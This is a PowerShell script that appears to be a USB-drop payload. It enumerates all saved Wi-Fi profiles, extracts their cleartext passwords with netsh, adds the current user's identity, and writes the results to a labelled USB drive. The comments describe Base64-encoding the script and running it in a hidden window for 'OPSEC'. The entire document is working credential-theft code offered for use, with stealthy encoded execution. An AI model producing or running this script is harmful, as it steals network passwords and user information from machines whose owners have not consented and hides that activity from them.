# Use @" to convert the script into a oneliner
# Encode it using ToBase64String
# Run the encodedcommand via powershell
# Powershell is run in hidden mode for OPSEC reasons 

$command = @"
$usbDrive = Get-WmiObject -Query 'SELECT * FROM Win32_Volume WHERE DriveType = 2' | Where-Object { $_.Label -eq 'USB_LABEL' }

if ($usbDrive) {
    $filePath = "$($usbDrive.DriveLetter)\test.txt"
    $wifiProfiles = netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object { ($_ -split ':\s*')[1].Trim() }
    $output = ""

    $wifiProfiles | ForEach-Object {
        $profile = $_
        $profileInfo = netsh wlan show profile name="$profile" key=clear
        $passwordMatch = $profileInfo | Select-String 'Key Content\s*:\s*(.*)' | ForEach-Object { $_.Matches[0].Groups[1].Value }
        $password = if ($passwordMatch) { $passwordMatch } else { "N/A" }
        $output += "Profile: $profile`nPassword: $password`n`n"
    }

    $userInfo = whoami
    $output += "`nUser Info: $userInfo`n"

    $output | Out-File -FilePath $filePath -Encoding utf8
}
"@

$encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
powershell.exe -windowstyle hidden -encodedcommand $encodedCommand
